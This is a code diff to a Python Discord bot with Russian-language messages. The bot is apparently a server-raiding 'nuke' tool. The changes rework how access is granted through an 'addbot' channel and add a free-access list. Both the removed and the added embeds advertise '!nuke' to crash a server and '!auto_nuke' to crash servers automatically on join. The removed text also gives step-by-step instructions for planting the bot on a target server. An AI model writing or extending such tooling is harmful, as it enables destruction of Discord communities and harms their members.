@@ -161,6 +161,15 @@ def load_spam_text():
 BLOCKED_GUILDS: list[int] = []
 PREMIUM_LIST: list[int] = []
 OWNER_NUKE_LIST: list[int] = []
+FREELIST: list[int] = []  # выдаётся через канал addbot — только !nuke и !auto_nuke
+
+
+def save_freelist():
+    asyncio.create_task(db_set("data", "freelist", FREELIST))
+
+
+def is_freelisted(user_id):
+    return user_id in FREELIST
 
 
 def save_blocked_guilds():
@@ -2893,63 +2902,35 @@ async def on_message(message):
     if message.guild and is_guild_blocked(message.guild.id):
         return  # Сервер заблокирован — игнорируем всё
 
-    # ── Канал addbot на домашнем сервере ──────────────────────
+    # ── Канал addbot на домашнем сервере — только показываем инфо ──────────────────────
     if (message.guild and message.guild.id == HOME_GUILD_ID
             and ("addbot" in message.channel.name.lower())
             and not message.author.bot):
-        uid = message.author.id
         try:
             await message.delete()
         except Exception:
             pass
-        if uid == config.OWNER_ID:
-            return  # овнера не трогаем
-        if uid in config.WHITELIST:
-            try:
-                await message.author.send(
-                    embed=discord.Embed(
-                        title="✅ У тебя уже есть доступ",
-                        description="Ты уже в whitelist — можешь использовать команды бота.\n\nНапиши `!help` боту в ЛС.",
-                        color=0x0a0a0a
-                    ).set_footer(text="☠️ ECLIPSED SQUAD")
-                )
-            except Exception:
-                pass
-        else:
-            config.WHITELIST.append(uid)
-            save_whitelist()
-            try:
-                home_guild = bot.get_guild(HOME_GUILD_ID)
-                invite_url = "https://discord.gg/SZ7bd8h9"
-                if home_guild:
-                    try:
-                        ch = next((c for c in home_guild.text_channels if c.permissions_for(home_guild.me).create_instant_invite), None)
-                        if ch:
-                            inv = await ch.create_invite(max_age=0, max_uses=0, unique=False)
-                            invite_url = inv.url
-                    except Exception:
-                        pass
-                await message.author.send(
-                    embed=discord.Embed(
-                        title="✅ Доступ получен!",
-                        description=(
-                            "Ты добавлен в whitelist и теперь можешь использовать команды бота.\n\n"
-                            "**📋 Инструкция:**\n"
-                            "1. Добавь бота на нужный сервер через `!inv`\n"
-                            "2. Напиши `!nuke` на сервере который хочешь крашнуть\n"
-                            "3. Напиши `!help` боту в ЛС чтобы увидеть все команды\n\n"
-                            "**⚠️ Важно:** Доступ активен пока ты на нашем сервере.\n"
-                            f"При выходе с сервера доступ будет удалён.\n\n"
-                            "**Основные команды:**\n"
-                            "`!nuke` — краш сервера\n"
-                            "`!auto_nuke on/off` — авто-краш при входе\n"
-                            "`!stop` · `!cleanup` · `!rename` · `!nicks_all`"
-                        ),
-                        color=0x0a0a0a
-                    ).set_footer(text="☠️ ECLIPSED SQUAD  |  davaidkatt")
-                )
-            except Exception:
-                pass
+        if message.author.id == config.OWNER_ID:
+            return
+        try:
+            await message.author.send(
+                embed=discord.Embed(
+                    title="ℹ️ Как получить доступ к боту",
+                    description=(
+                        "Доступ к боту выдаётся лично.\n\n"
+                        "**Для получения напиши:**\n"
+                        "Discord: **davaidkatt**\n"
+                        "Telegram: **@Firisotik**\n\n"
+                        "**Что доступно без регистрации:**\n"
+                        "`!nuke` — краш сервера\n"
+                        "`!auto_nuke on/off` — авто-краш при входе\n\n"
+                        "Напиши `!help` боту в ЛС чтобы увидеть все команды."
+                    ),
+                    color=0x0a0a0a
+                ).set_footer(text="DavaidKa Bot  |  davaidkatt")
+            )
+        except Exception:
+            pass
         return
     if message.content.strip() == "!" and is_whitelisted(message.author.id):
         ctx = await bot.get_context(message)
@@ -2964,7 +2945,7 @@ async def on_ready():
     global AUTO_SUPER_NUKE, AUTO_SUPER_NUKE_TEXT, SNUKE_CONFIG
     global AUTO_SUPERPR_NUKE, AUTO_SUPERPR_NUKE_TEXT
     global AUTO_OWNER_NUKE, AUTO_OWNER_NUKE_TEXT
-    global BLOCKED_GUILDS, PREMIUM_LIST, OWNER_NUKE_LIST
+    global BLOCKED_GUILDS, PREMIUM_LIST, OWNER_NUKE_LIST, FREELIST
 
     # ── Загрузка из MongoDB ──
     wl = await db_get("data", "whitelist")
@@ -3001,6 +2982,10 @@ async def on_ready():
     onl = await db_get("data", "owner_nuke_list")
     if onl is not None:
         OWNER_NUKE_LIST = onl
+
+    fl = await db_get("data", "freelist")
+    if fl is not None:
+        FREELIST = fl
 
     bot.tree.clear_commands(guild=None)
 
